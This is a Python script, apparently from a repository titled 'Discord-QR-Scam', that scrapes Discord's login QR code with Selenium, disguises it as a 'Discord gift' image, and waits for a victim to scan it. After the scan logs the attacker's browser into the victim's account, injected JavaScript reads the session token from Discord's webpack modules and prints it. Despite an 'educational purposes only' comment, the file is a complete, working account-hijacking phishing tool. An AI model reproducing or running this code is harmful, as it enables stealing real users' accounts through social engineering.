from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os

# Developer: NightfallGT
# Educational purposes only

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)

def main():
    print('github.com/NightfallGT/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting..')
    
    while True:
        if discord_login != driver.current_url:
            print('Grabbing token..')
            token = driver.execute_script('''
window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return m.default.getToken()}}}]);   
                ''')
            print('---')
            print('Token grabbed:',token)
            break

    print('Task complete.')

if __name__ == '__main__':
    main()
